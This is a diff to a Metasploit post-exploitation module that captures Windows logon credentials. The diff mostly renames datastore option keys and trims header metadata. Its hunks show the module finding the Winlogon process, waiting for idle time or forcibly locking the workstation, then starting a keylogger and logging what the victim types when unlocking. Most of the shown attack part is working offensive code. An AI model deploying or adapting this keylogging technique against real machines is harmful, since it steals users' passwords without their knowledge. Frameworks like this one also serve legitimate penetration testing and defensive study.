@@ -1,8 +1,4 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # web site for more information on licensing and terms of use.
@@ -25,9 +21,8 @@ class Metasploit3 < Msf::Post
 					Winlogon.exe. Using idle time and natural system changes to give a
 					false sense of security to the user.},
 			'License'      => MSF_LICENSE,
-			'Author'       => ['Rob Fuller <mubix[at]hak5.org>', 'cg'],
-			'Version'      => '$Revision$',
-			'Platform'     => ['windows'],
+			'Author'       => [ 'mubix', 'cg' ],
+			'Platform'     => ['win'],
 			'SessionTypes' => ['meterpreter'],
 			'References'   => [['URL', 'http://blog.metasploit.com/2010/12/capturing-windows-logons-with.html']]
 		))
@@ -174,14 +169,14 @@ class Metasploit3 < Msf::Post
 		end
 
 		mypid = session.sys.process.getpid
-		if datastore['pid'] == 0
+		if datastore['PID'] == 0
 			targetpid = get_winlogon
 			if targetpid == 'exit'
 				return
 			end
 			print_status("Found WINLOGON at PID:#{targetpid}")
 		else
-			targetpid = datastore['pid']
+			targetpid = datastore['PID']
 			print_status("WINLOGON PID:#{targetpid} specified. I'm trusting you...")
 		end
 
@@ -210,7 +205,7 @@ class Metasploit3 < Msf::Post
 
 		print_good("Keylogging for #{client.info}")
 		file_local_write(logfile,"#{client.info}\n")
-		if datastore['wait'] then
+		if datastore['WAIT'] then
 			print_status("Waiting for user to lock out their session")
 			locked = false
 			while locked == false
@@ -225,9 +220,9 @@ class Metasploit3 < Msf::Post
 		else
 			currentidle = session.ui.idle_time
 			print_status("System has currently been idle for #{currentidle} seconds")
-			while currentidle <= datastore['locktime'] do
+			while currentidle <= datastore['LOCKTIME'] do
 				print_status("Current Idle time: #{currentidle} seconds")
-				select(nil,nil,nil,datastore['heartbeat'])
+				select(nil,nil,nil,datastore['HEARTBEAT'])
 				currentidle = session.ui.idle_time
 			end
 			client.railgun.user32.LockWorkStation()
@@ -244,7 +239,7 @@ class Metasploit3 < Msf::Post
 		end
 
 		if startkeylogger(session)
-			keycap(session, datastore['interval'], logfile)
+			keycap(session, datastore['INTERVAL'], logfile)
 		end
 	end
 end
